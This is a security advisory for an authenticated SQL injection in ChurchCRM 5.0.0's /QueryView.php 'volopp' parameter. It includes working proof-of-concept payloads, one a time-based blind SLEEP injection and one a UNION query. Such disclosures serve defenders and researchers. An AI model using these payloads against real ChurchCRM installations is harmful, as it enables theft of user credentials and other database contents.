# CVE-2023-38771 - SQL Injection in /QueryView.php?QueryID=25

|                 |                                                                                      |
| --------------- | --------------- |
| Researchers     | Rowan Crowley                                                               |
| Severity        | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)                                   |
| Published       | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38771         |
| Software Link   | https://github.com/ChurchCRM/CRM             |

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the `volopp` parameter within the `/QueryView.php` endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the `volopp` parameter at the `/QueryView.php?QueryID=25` endpoint (Volunteers - 'for a particular opportunity' query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: volopp (POST)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: volopp=50 AND (SELECT 9767 FROM (SELECT(SLEEP(5)))JKHg)&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: volopp=50 UNION ALL SELECT CONCAT(0x7170707871,0x58756c7061704b67716d475a706c69426c427263675a4d43656563746d4273674d6775737651594d,0x717a766271),NULL-- -&Submit=Execute Query
